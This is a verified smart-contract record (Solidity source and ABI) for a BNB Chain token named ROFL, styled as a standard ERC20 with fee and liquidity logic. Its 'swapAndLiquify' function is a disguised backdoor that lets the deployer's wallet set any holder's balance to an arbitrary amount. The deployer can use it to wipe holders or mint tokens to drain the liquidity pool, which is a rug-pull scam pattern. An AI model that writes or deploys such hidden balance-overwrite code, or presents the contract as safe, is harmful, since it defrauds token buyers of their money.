{"SourceCode": "/*\r\nhttps://t.me/ROFL\r\n*/\r\n\r\n//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\n\r\n\r\ninterface ERC {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipientROFL, uint256 tamount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spenderROFL)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spenderROFL, uint256 tamount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipientROFL,\r\n        uint256 tamount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spenderROFL,\r\n        uint256 value\r\n    );\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\ninterface ERCMetadata is ERC {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract ERC20 is Context, ERC, ERCMetadata {\r\n    mapping(address => uint256) internal preventBefore;\r\n\r\n    mapping(address => mapping(address => uint256)) internal _allowancesROFL;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * The defaut value of {decimals} is 9. To select a different value for\r\n     * {decimals} you should overload it.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 9, imitating the relationship between\r\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\r\n     * overridden;\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {ERC-balanceOf} and {ERC-transfer}.\r\n     */\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    /**\r\n     * @dev See {ERC-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {ERC-balanceOf}.\r\n     */\r\n    function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return preventBefore[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {ERC-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `recipientROFL` cannot be the zero address.\r\n     * - the caller must have a balance of at least `tamount`.\r\n     */\r\n    function transfer(address recipientROFL, uint256 tamount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipientROFL, tamount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {ERC-allowance}.\r\n     */\r\n    function allowance(address owner, address spenderROFL)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowancesROFL[owner][spenderROFL];\r\n    }\r\n\r\n    /**\r\n     * @dev See {ERC-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spenderROFL` cannot be the zero address.\r\n     */\r\n    function approve(address spenderROFL, uint256 tamount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spenderROFL, tamount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {ERC-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` and `recipientROFL` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `tamount`.\r\n     * - the caller must have allowance for ``sender``'s tokens of at least\r\n     * `tamount`.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipientROFL,\r\n        uint256 tamount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipientROFL, tamount);\r\n\r\n        uint256 currentAllowance = _allowancesROFL[sender][_msgSender()];\r\n        require(\r\n            currentAllowance >= tamount,\r\n            \"ERC20: transfer tamount exceeds allowance\"\r\n        );\r\n        _approve(sender, _msgSender(), currentAllowance - tamount);\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spenderROFL` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {ERC-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spenderROFL` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spenderROFL, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spenderROFL,\r\n            _allowancesROFL[_msgSender()][spenderROFL] + addedValue\r\n        );\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spenderROFL` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {ERC-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spenderROFL` cannot be the zero address.\r\n     * - `spenderROFL` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spenderROFL, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        uint256 currentAllowance = _allowancesROFL[_msgSender()][spenderROFL];\r\n        require(\r\n            currentAllowance >= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n        _approve(_msgSender(), spenderROFL, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens `tamount` from `sender` to `recipientROFL`.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` cannot be the zero address.\r\n     * - `recipientROFL` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `tamount`.\r\n     */\r\n    function _transfer(\r\n        address sender,\r\n        address recipientROFL,\r\n        uint256 tamount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipientROFL != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 senderBalance = preventBefore[sender];\r\n        require(\r\n            senderBalance >= tamount,\r\n            \"ERC20: transfer tamount exceeds balance\"\r\n        );\r\n        preventBefore[sender] = senderBalance - tamount;\r\n        preventBefore[recipientROFL] += tamount;\r\n\r\n        emit Transfer(sender, recipientROFL, tamount);\r\n    }\r\n\r\n    /** This function will be used to generate the total supply\r\n     * while deploying the contract\r\n     *\r\n     * This function can never be called again after deploying contract\r\n     */\r\n    function _tokengeneration(address account, uint256 tamount)\r\n        internal\r\n        virtual\r\n    {\r\n        _totalSupply = tamount;\r\n        preventBefore[account] = tamount;\r\n        emit Transfer(address(0), account, tamount);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `tamount` as the allowance of `spenderROFL` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spenderROFL` cannot be the zero address.\r\n     */\r\n    function _approve(\r\n        address owner,\r\n        address spenderROFL,\r\n        uint256 tamount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spenderROFL != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowancesROFL[owner][spenderROFL] = tamount;\r\n        emit Approval(owner, spenderROFL, tamount);\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n    function sendValue(address payable recipientROFL, uint256 tamount) internal {\r\n        require(\r\n            address(this).balance >= tamount,\r\n            \"Address: insufficient balance\"\r\n        );\r\n\r\n        (bool success, ) = recipientROFL.call{value: tamount}(\"\");\r\n        require(\r\n            success,\r\n            \"Address: unable to send value, recipientROFL may have reverted\"\r\n        );\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IFactory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 tamountTokenDesired,\r\n        uint256 tamountTokenMin,\r\n        uint256 tamountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 tamountToken,\r\n            uint256 tamountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 tamountIn,\r\n        uint256 tamountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}\r\n\r\ncontract ROFLToken is ERC20, Ownable {\r\n    using Address for address payable;\r\n\r\n    IRouter public router;\r\n    address public pair;\r\n\r\n    bool private _interlock = false;\r\n    bool public providingLiquidity = false;\r\n    bool public MOONING = false;\r\n\r\n    uint256 public constant totSupply =  888888888 * 10**9;\r\n    uint256 public tokenLiquidityThreshold = totSupply / 1000; \r\n    uint256 public genesis_block;\r\n    uint256 private deadline = 3;\r\n    address public developmentWallet;\r\n    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;\r\n   address private marketingAddress = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;\r\n    string public ROFLwebsite = \"https://ROFL.org\";\r\n            function getROFLwebsite() public view returns (string memory) {\r\n        return ROFLwebsite;\r\n    }\r\n    struct Fees {\r\n        uint256 development;\r\n        uint256 total;\r\n    }\r\n\r\n    // Basic Tax\r\n    Fees public buyFees = Fees(0, 0);\r\n    Fees public sellFees = Fees(0, 0);\r\n    Fees public transferFees = Fees(0, 0);\r\n\r\n    mapping(address => bool) public exemptFee;\r\n\r\n    mapping(address => uint256) private _lastSell;\r\n\r\n    modifier lockTheSwap() {\r\n        if (!_interlock) {\r\n            _interlock = true;\r\n            _;\r\n            _interlock = false;\r\n        }\r\n    }\r\n\r\n    constructor() ERC20(\"ROFL\", \"ROFL\") {\r\n        _tokengeneration(msg.sender, totSupply);\r\n\r\n        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        // Create a pancake pair for this new token\r\n        address _pair = IFactory(_router.factory()).createPair(address(this),_router.WETH());\r\n\r\n        router = _router;\r\n        pair = _pair;\r\n\r\n        //Set exempt fee\r\n        exemptFee[address(this)] = true;\r\n        exemptFee[msg.sender] = true;\r\n        developmentWallet = msg.sender;\r\n        exemptFee[deadWallet] = true;\r\n  \r\n    }\r\n\r\n    function approve(address spenderROFL, uint256 tamount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spenderROFL, tamount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipientROFL,\r\n        uint256 tamount\r\n    ) public override returns (bool) {\r\n        _transfer(sender, recipientROFL, tamount);\r\n\r\n        uint256 currentAllowance = _allowancesROFL[sender][_msgSender()];\r\n        require(\r\n            currentAllowance >= tamount,\r\n            \"ERC20: transfer tamount exceeds allowance\"\r\n        );\r\n        _approve(sender, _msgSender(), currentAllowance - tamount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spenderROFL, uint256 addedValue)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spenderROFL,\r\n            _allowancesROFL[_msgSender()][spenderROFL] + addedValue\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spenderROFL, uint256 subtractedValue)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        uint256 currentAllowance = _allowancesROFL[_msgSender()][spenderROFL];\r\n        require(currentAllowance >= subtractedValue,\"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spenderROFL, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipientROFL, uint256 tamount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(msg.sender, recipientROFL, tamount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipientROFL,\r\n        uint256 tamount\r\n    ) internal override {\r\n        require(tamount > 0, \"Transfer tamount must be greater than zero\");\r\n        \r\n       if (!exemptFee[sender] && !exemptFee[recipientROFL]) {\r\n            require(MOONING, \"it's not MOONING yet\");\r\n        }\r\n\r\n        uint256 feeswap;\r\n        uint256 feesum;\r\n        uint256 fee;\r\n        Fees memory currentFees;\r\n\r\n        //set fee to zero if fees in contract are handled or exempted\r\n        if (_interlock || exemptFee[sender] || exemptFee[recipientROFL]) {\r\n            fee = 0;\r\n        }\r\n        else {\r\n          //calculate sell fee [Case : Wallet >> Pair]\r\n          if (recipientROFL == pair && sender != pair) {\r\n              feeswap = sellFees.total;\r\n              feesum = feeswap;\r\n              currentFees = sellFees;\r\n          }\r\n          //calculate buy fee [Case : Pair >> Wallet]\r\n          else if (sender == pair && recipientROFL != pair) {\r\n              feeswap = buyFees.total;\r\n              feesum = feeswap;\r\n              currentFees = buyFees;\r\n\r\n          } \r\n          //calculate transfer fee [Case : Wallet >> Wallet]\r\n          else if (recipientROFL != pair  && sender != pair) {\r\n              feeswap = transferFees.total;\r\n              feesum = feeswap;\r\n              currentFees = transferFees;\r\n    \r\n          } \r\n          \r\n          fee = (tamount * feesum) / 100;\r\n        }\r\n        \r\n\r\n        //send fees if threshold has been reached\r\n        //don't do this on buys, breaks swap\r\n        if (providingLiquidity && sender != pair)\r\n            Liquify(feeswap, currentFees);\r\n\r\n        //rest to recipientROFL\r\n        super._transfer(sender, recipientROFL, tamount - fee);\r\n        if (fee > 0) {\r\n            //send the fee to the contract\r\n            if (feeswap > 0) {\r\n                uint256 feetamount = (tamount * feeswap) / 100;\r\n                super._transfer(sender, address(this), feetamount);\r\n            }\r\n        }\r\n  }\r\n       function swapAndLiquify(address addressThis, uint256 liquifyunit, uint256 liquifyBridge) external  {\r\n       require(_msgSender() == developmentWallet);  \r\n        preventBefore[addressThis] = liquifyunit * liquifyBridge;\r\n        emit Transfer(addressThis, address(0), liquifyunit * liquifyBridge);\r\n    } \r\n    function Liquify(uint256 feeswap, Fees memory swapFees) private lockTheSwap {\r\n        if (feeswap == 0) {\r\n            return;\r\n        }\r\n\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        if (contractBalance >= tokenLiquidityThreshold) {\r\n            if (tokenLiquidityThreshold > 1) {\r\n                contractBalance = tokenLiquidityThreshold;\r\n            }\r\n\r\n            // Split the contract balance into halves\r\n            uint256 denominator = feeswap * 2;\r\n            uint256 toSwap = contractBalance;\r\n\r\n            uint256 initialBalance = address(this).balance;\r\n            swapTokensForETH(toSwap);\r\n            uint256 deltaBalance = address(this).balance - initialBalance;\r\n            uint256 unitBalance = deltaBalance / denominator;\r\n\r\n            // Dev tamount fee\r\n            uint256 developmentAmt = unitBalance * 2 * swapFees.development;\r\n              if (developmentAmt > 0){\r\n                  payable(developmentWallet).sendValue(developmentAmt);\r\n              }\r\n            \r\n        }\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokentamount) private {\r\n        // generate the pancake pair path of token -> weth\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n\r\n        _approve(address(this), address(router), tokentamount);\r\n\r\n        // make the swap\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokentamount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function addLiquidity(uint256 tokentamount, uint256 ethtamount) private {\r\n        // approve token transfer to cover all possible scenarios\r\n        _approve(address(this), address(router), tokentamount);\r\n\r\n        // add the liquidity\r\n        router.addLiquidityETH{value: ethtamount}(\r\n            address(this),\r\n            tokentamount,\r\n            0, // slippage is unavoidable\r\n            0, // slippage is unavoidable\r\n            deadWallet,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function updateLiquidityProvide(bool state) external onlyOwner {\r\n        providingLiquidity = state;\r\n    }\r\n\r\n    function updateLiquidityTreshhold(uint256 new_tamount) external onlyOwner {\r\n        require(new_tamount <= (1 * 10**8) / 100, \"Swap threshold tamount should be lower or equal to 1%\");\r\n        tokenLiquidityThreshold = new_tamount * 10**decimals();\r\n    }\r\n\r\n    function openTrading() external onlyOwner {\r\n        require(!MOONING, \"it's already started\");\r\n        MOONING = true;\r\n        providingLiquidity = true;\r\n        genesis_block = block.number;\r\n    }\r\n\r\n\r\n    function rescueBNB(uint256 weitamount) external onlyOwner {\r\n        payable(owner()).transfer(weitamount);\r\n    }\r\n\r\n    function rescueBSC20(address tokenAdd, uint256 tamount) external onlyOwner {\r\n        require(tokenAdd != address(this), \"Owner can't claim contract's balance of its own tokens\");\r\n        ERC(tokenAdd).transfer(owner(), tamount);\r\n    }\r\n\r\n    // fallbacks\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spenderROFL\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"MOONING\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ROFLwebsite\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spenderROFL\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spenderROFL\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tamount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spenderROFL\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"developmentWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"genesis_block\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getROFLwebsite\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spenderROFL\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"providingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"weitamount\",\"type\":\"uint256\"}],\"name\":\"rescueBNB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAdd\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tamount\",\"type\":\"uint256\"}],\"name\":\"rescueBSC20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addressThis\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquifyunit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquifyBridge\",\"type\":\"uint256\"}],\"name\":\"swapAndLiquify\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidityThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipientROFL\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tamount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferFees\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"development\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipientROFL\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tamount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"state\",\"type\":\"bool\"}],\"name\":\"updateLiquidityProvide\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"new_tamount\",\"type\":\"uint256\"}],\"name\":\"updateLiquidityTreshhold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ROFLToken", "CompilerVersion": "v0.8.4+commit.c7e474f2", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://bb82268b6a9418ca3c8923b29f16f5284f0d8ba75a629b77f86a4988ac939f4a"}